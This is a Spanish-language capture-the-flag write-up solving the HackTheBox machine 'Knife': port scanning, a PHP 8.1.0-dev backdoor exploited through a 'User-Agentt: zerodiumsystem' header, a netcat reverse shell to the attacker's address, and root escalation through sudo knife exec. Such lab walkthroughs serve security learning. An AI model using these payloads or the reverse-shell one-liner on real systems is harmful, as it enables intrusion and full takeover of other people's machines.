---
title: HackTheBox - Knife
categories: [Linux]
tags: [HackTheBox]
image: knife.png 
img_path: /assets/HTB/Knife/
---

En este post voy a explicar como resolver la máquina Knife de [Hack The Box](https://app.hackthebox.com/machines/347), en la cual vamos a estar tocando un Remote Code Execution mediante la cabezera ```User-Agent``` y luego para la escalada utilizaremos los permisos de la herramienta ```Knife```.

## Escaneo de puertos

```
# nmap -p- -sS --min-rate 5000 -sCV -oN nmap -n -Pn 10.10.10.242
Nmap scan report for 10.10.10.242
Host is up (0.24s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 be549ca367c315c364717f6a534a4c21 (RSA)
|   256 bf8a3fd406e92e874ec97eab220ec0ee (ECDSA)
|_  256 1adea1cc37ce53bb1bfb2b0badb3f684 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title:  Emergent Medical Idea
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Como vemos, la página tiene los puertos 22 (SSH) y 80 (HTTP) abiertos.

# Enumeración
Al ingresar a la página, vemos esto.

<img src="knife-pagina.png">

Si usamos la herramienta whatweb la cual sirve para recopilar información sobre una aplicación web, vemos que se está utilizando PHP/8.1.0-dev.


```
$ whatweb http://10.10.10.242/

Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], PHP[8.1.0-dev], Title[Emergent Medical Idea], X-Powered-By[PHP/8.1.0-dev]
```

El problema que hay con esta versión, es que es vulnerable a un Remote Code Execution, ya que un atacante puede ejecutar comandos usando la siguiente cabecera ```User-Agentt: zerodiumsystem("cat /etc/passwd");```

# Reverse Shell
Para ganar acceso a la máquina, nos mandaremos una Reverse Shell explotando la vulnerabilidad anteriormente encontrada.

```
$ curl 10.10.10.242 -H 'User-Agentt: zerodiumsystem("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.3 443 >/tmp/f");'
```

```
$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.242] 52680
bash: cannot set terminal process group (963): Inappropriate ioctl for device
bash: no job control in this shell
james@knife:/$
```

# Enumeración del sistema

Una vez ganado acceso a la máquina, vemos que somos el usuario ```james```, si hacemos un sudo -l podemos ver que tenemos permiso para ejecutar el programa ```knife``` como ```root``` sin proporcionar contraseña.

```
james@knife:/$ sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```

# Escalada de privilegios
Knife tiene un parámetro llamado exec, el cual permite la ejecución de scripts Ruby, les dejaré un ejemplo.

```
$ knife exec -E 'exec "/ruta/del/script"'
```

Sabiendo esto, podemos hacer que el usuario root ejecuta /bin/bash.

```
james@knife:/$ sudo knife exec -E 'exec "/bin/bash"'
root@knife:/home/james# cd
root@knife:/# cat root.txt
126f179b57e1f6d63efc96636a914e6f
```
